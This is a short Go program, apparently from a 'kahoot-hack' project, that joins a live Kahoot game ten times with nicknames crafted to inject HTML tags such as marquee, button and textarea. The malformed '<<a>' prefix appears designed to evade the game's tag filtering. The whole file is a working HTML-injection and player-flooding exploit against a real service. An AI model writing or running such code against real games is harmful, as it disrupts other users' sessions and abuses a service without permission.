package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/unixpickle/kahoot-hack/kahoot"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintln(os.Stderr, "Usage: html <game pin> <nickname>")
		os.Exit(1)
	}

	gamePin := os.Args[1]
	nickname := os.Args[2]

	for _, prefix := range []string{"h1", "u", "h2", "marquee", "button",
		"input", "pre", "textarea", "b", "i"} {
		if conn, err := kahoot.NewConn(gamePin); err != nil {
			fmt.Fprintln(os.Stderr, "failed to connect:", err)
			os.Exit(1)
		} else {
			defer conn.GracefulClose()
			conn.Login("<<a>" + prefix + ">" + nickname)
		}
	}

	fmt.Println("Kill this process to deauthenticate.")
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
}
